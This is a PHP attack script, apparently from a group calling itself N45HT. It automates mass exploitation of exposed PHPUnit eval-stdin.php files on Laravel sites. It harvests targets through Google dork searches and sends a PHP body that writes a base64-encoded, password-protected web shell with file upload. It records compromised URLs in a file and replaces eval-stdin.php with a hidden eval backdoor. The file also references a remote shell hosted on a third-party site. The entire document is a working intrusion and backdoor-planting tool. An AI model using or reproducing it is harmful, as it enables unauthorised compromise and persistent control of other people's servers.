<?php

define("SHELL", "http://www.ladimoradelsole.it/joomla/media/shell.txt");
define("SHELL_NAME", "k3.php");
define("SHELL_PASSWORD", "N45HT");
define("HOST", "https://www.google.com");
define("PATH", "/phpunit/phpunit/src/Util/PHP/eval-stdin.php");
define("PATH_UPLOAD", "/phpunit/phpunit/src/Util/PHP/");
define("USER_AGENT", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36");
define("DEBUG", FALSE);

class PHPUnit {

    function __construct() {
        if(!is_dir(__DIR__."/.cookie")) 
            mkdir(__DIR__."/.cookie");

        echo " _                              _
| |    __ _ _ __ __ ___   _____| |
| |   / _` | '__/ _` \ \ / / _ \ |
| |__| (_| | | | (_| |\ V /  __/ |
|_____\__,_|_|  \__,_| \_/ \___|_|\n
PHP_auto Exploit (Rce) <\> Johny from N45HT!\n
thank TO : ShinChan, Mr./Thumbnai1s, and YOU!\n\n
Laravel PHPUnit V.2 Upgraded \n";
    }

    private function urlSorter($url) {
        preg_match_all("#(.*?)\/vendor/#i", $url, $o);
        
        $path = pathinfo($url);
        return count($o)[1] > 0 ? $o."/vendor" : $path['dirname']."/vendor";
    }

    private function dataScrap($url, $header, $post, $reff, $transfer, $result) {
        $headers = array();
        $headers[] = "Content-Type: application/x-www-form-urlencoded";

        $ch = curl_init();

        if($header):
            curl_setopt($ch, CURLOPT_HEADER, $header);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        endif;

        if($post != null):
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
            curl_setopt($ch, CURLOPT_POSTFIELDS,['data'=>$post]);
        endif;

        $reff != null ? curl_setopt($ch, CURLOPT_REFERER, $reff) : curl_setopt($ch, CURLOPT_AUTOREFERER, true);

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 120);
        
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, $transfer);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_USERAGENT, USER_AGENT);
        
		curl_setopt($ch, CURLOPT_COOKIESESSION, true);
		curl_setopt($ch, CURLOPT_COOKIEJAR, __DIR__."/.cookie/.cookie".rand(0, 100000)."-".rand(0, 100000));
        curl_setopt($ch, CURLOPT_COOKIEFILE, __DIR__."/.cookie/.cookie".rand(0, 100000)."-".rand(0, 100000));

        curl_setopt($ch, CURLOPT_VERBOSE, DEBUG);
        
        $response = curl_exec($ch);
        $responseCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        return $result ? $response : $responseCode;
    }

    public function startBot($dork) {
        $hasScanned = [];
        $total = 0;
        $refferer = HOST."/";
        
        while(true) {
            $params = "/search?q=$dork&start=$total";
            $dataSite = $this->dataScrap(HOST.$params, true, null, $refferer, true, true);

            preg_match_all('#<div class="r"><a href="(.*?)" ping=#is', $dataSite, $dataPage);
            
            if(count($dataPage[1]) == 0 && $total == 0):
                echo "[ - ] BLANK\n";
                exit;
            elseif(count($dataPage[1]) == 0):
                break;

            else:
                $data = array_unique($dataPage[1]);
                sort($data);
                
                foreach($data as $url) {
                    $url = $this->urlSorter(html_entity_decode($url));
                    echo "[ - ] Target : [ $url ]\n";

                    if(!in_array($url, $hasScanned)) {
                        $hasScanned[] = $url;
                        
                        $getVersion = $this->dataScrap(dirname($url), true, null, null, false, true);
                        $versionToJson = json_decode($getVersion);
                        $versionCheck = str_replace(['~','^','.','*','>','<','='],'' , $versionToJson['require-dev']['phpunit/phpunit']);
                        if(isset($versionCheck) && !empty($versionCheck)) {
                            $version = $versionToJson['require-dev']['phpunit/phpunit'];

                            $payload = 'PD9waHAKc2Vzc2lvbl9zdGFydCgpOwpAaW5pX3NldCgnb3V0cHV0X2J1ZmZlcmluZycsIDApOwpAaW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLCAwKTsKc2V0X3RpbWVfbGltaXQoMCk7CmluaV9zZXQoJ21lbW9yeV9saW1pdCcsICc2NE0nKTsKaGVhZGVyKCdDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCcpOwppZihpc3NldCgkX1NFU1NJT05bJ3VzZXInXSkgYW5kICFlbXB0eSgkX1NFU1NJT05bJ3VzZXInXSkpewplY2hvIHBocF91bmFtZSgpOwplY2hvICc8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBuYW1lPSJ1cGxvYWRlciIgaWQ9InVwbG9hZGVyIj4nOwplY2hvICc8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgc2l6ZT0iNTAiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiIGlkPSJfdXBsIiB2YWx1ZT0iVXBsb2FkIj48L2Zvcm0+JzsKaWYgKCRfUE9TVFsnX3VwbCddID09ICJVcGxvYWQiKSB7CiAgICBpZiAoQGNvcHkoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddLCAkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXSkpIHsKICAgICAgICBlY2hvICdVcGxvYWQgb2sgOkQgISEhJzsKICAgIH0gZWxzZSB7CiAgICAgICAgZWNobyAnVXBsb2FkIEZhaWwgISEhJzsKICAgIH0KfQp9ZWxzZXsKZWNobyAnPGNlbnRlcj4nOwplY2hvICc8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0Ij4nOwplY2hvICc8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlciIgc2l6ZT0iNTAiPjxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9Il9sb2dpbiIgaWQ9Il9sb2dpbiIgdmFsdWU9IkxPR0lOIj48L2Zvcm0+JzsKfQppZigkX1BPU1RbJ19sb2dpbiddID09ICJMT0dJTiIgYW5kIG1kNSgkX1BPU1RbInVzZXIiXSk9PSAnOTU3MmI4YWZlYWM2NmIyZGU2YmU4OWVmZjBjMGQ5N2MnKSB7CiRfU0VTU0lPTlsndXNlciddPSdONDVIVCc7Cn0='; 
                            $body = '<?php echo("PETR03X_WAS_HERE");fwrite(fopen("'.$this->shell_name.'","w"),base64_decode("'.base64_encode(str_replace('9572b8afeac66b2de6be89eff0c0d97c',md5(SHELL_PASSWORD),base64_decode($payload))).'")); ?>';
                            $delete = '<?php fwrite(fopen("eval-stdin.php","w"),base64_decode("PD9waHAgaWYobWQ1KCRfR0VUWyd1c2VyJ10pPT0nOTM2YTM1ZDFmMzE5OTJlZGQ2YzJkMWQ3MjVkYmVkOGMnKXtldmFsKCc/PicgLiBmaWxlX2dldF9jb250ZW50cygncGhwOi8vc3RkaW4nKSk7fT8+"));?>'; 
                            
                            $checkCode = $this->dataScrap($url.PATH, true, null, null, true, false);
                            echo "[ - ] Respon : [ $checkCode ]\n";
                            echo "[ - ] Version : [ $version ]\n";

                            if($checkCode == "200" || $checkCode == "302" || $checkCode == "403" || $checkCode == "0") {
                                $uploadTheExploit = $this->dataScrap($url.PATH, true, $body, null, true, true);
                                $checkExploit = preg_match('#PETR03X#is', $uploadTheExploit) ? true : false;
                                
                                if($checkExploit) {
                                    echo "[ - ] Checking ...";
                                    $file = fopen("target.txt", "a");
                                    
                                    $uploadShell = $this->dataScrap($url.PATH_UPLOAD.SHELL_NAME, true, null, null, false, false);
                                    if($uploadShell == "200") {
                                        echo "[ - ] Status : [ SUCCESS EXPLOIT ]\n";
                                        fwrite($file, $url.PATH_UPLOAD.SHELL_NAME);
                                        sleep(1);
                                        continue;
                                    } else {
                                        echo "[ - ] Status : [ FAILED EXPLOIT ]\n";
                                        fwrite($file, $url.PATH_UPLOAD.SHELL_NAME);
                                        sleep(1);
                                        continue;
                                    }
                                } else {
                                    echo "[ - ] Status : [ NOT VULN ]\n";
                                    sleep(1);
                                    continue;
                                }
                            } else {
                                echo "[ - ] Status : [ NOT VULN ]\n";
                                sleep(1);
                                continue;
                            }
                        } else {
                            echo "[ - ] Status : [ NOT VULN ]\n";
                            sleep(1);
                            continue;
                        }
                    } else {
                        echo "[ - ] Status : [ SITE HAS BEEN CHECK ]\n";
                        sleep(1);
                    }
                }
            endif;
            
            $total += 10;
            sleep(1);
        }
    }
}


$botInitialize = new PHPUnit();


if(!empty($argv[1])) $botInitialize->startBot($argv[1]); 
else echo "\n\nUsage: $argv[0] dork_google\n";